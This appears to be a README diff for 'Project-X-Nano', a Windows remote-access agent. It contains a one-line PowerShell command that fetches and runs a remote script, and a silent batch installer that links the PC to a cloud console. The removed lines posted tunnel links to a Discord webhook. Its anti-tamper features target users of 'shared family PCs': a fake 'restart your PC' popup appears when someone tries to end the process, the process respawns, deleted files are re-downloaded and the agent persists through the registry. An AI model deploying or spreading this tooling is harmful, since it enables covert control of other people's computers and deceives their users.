@@ -48,31 +48,30 @@ Project-X-Nano operates on a **24/7/365 Serverless Cloud Infrastructure** backed
 
 ## ⚡ 1-Line Universal Setup (Run on Any Windows PC)
 
-Deploy the full agent to any PC with a single command or double-click. It automatically downloads all core binaries from GitHub, starts the backend, generates an encrypted Cloudflare Tunnel, and uploads the public remote link to your central server / Discord webhook:
+Deploy the full agent to any PC with a single PowerShell command or double-click. It automatically downloads all core binaries from GitHub, starts the agent silently in the background, and connects directly to your **24/7 Neon & Vercel Cloud Hub** (zero Cloudflare, zero port-forwarding, zero timeouts):
 
-### Method A: Single PowerShell Command
+### Method A: Single 1-Line PowerShell Command (Recommended)
 ```powershell
-& ([scriptblock]::Create((irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1))) -ReportUrl "https://discord.com/api/webhooks/your/webhook"
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1)))
 ```
-*(Leave out `-ReportUrl` if you only want local LAN access or automatic TryCloudflare forwarding)*
 
-### Method B: Double-Click Batch Installer
+### Method B: 1-Click Batch Installer
 1. Download or copy `install_agent.bat` onto the target PC.
 2. Double-click **`install_agent.bat`**.
-3. It will prompt for your webhook/server URL (or press Enter to skip) and handle everything silently in the background!
+3. It displays the futuristic installation screen, configures autostart and the watchdog shield, and links the device to your central cloud hub automatically!
 
-> **Local Dashboard:** `http://localhost:8765`  
-> **Public Cloudflare URL:** Generated automatically and written to `public_url.txt` + posted to your webhook!
+> **24/7 Central Fleet Console:** [https://project-x-alpha-lake.vercel.app](https://project-x-alpha-lake.vercel.app)  
+> **Local Fallback Hub:** `http://localhost:8765`
 
 ---
 
 ## 🛡️ Anti-Tamper Watchdog & Self-Healing Integrity
 
 Built for durability on shared family PCs:
-- **Task Manager Kill Protection:** If a user or family member tries to end `Project-X-Nano` or `cloudflared` from Task Manager, a native system popup is displayed:  
+- **Task Manager Kill Protection:** If a user tries to end `Project-X-Nano` from Task Manager, a native system popup is displayed:  
   `"You need to restart your PC to stop that exe."`  
   and the background service is immediately re-spawned!
-- **Self-Healing Integrity Engine:** If critical files (`.exe`, `config.json`, `cloudflared.exe`) are deleted or tampered with, the agent detects the missing files and downloads fresh copies from the GitHub repository in parallel.
+- **Self-Healing Integrity Engine:** If critical files (`.exe`, `config.json`) are deleted or tampered with, the watchdog detects the missing files and downloads fresh copies from the GitHub repository in parallel.
 - **Persistent Autostart:** Survives reboots via both the Windows Run registry and background watchdog monitoring.
 
 ---
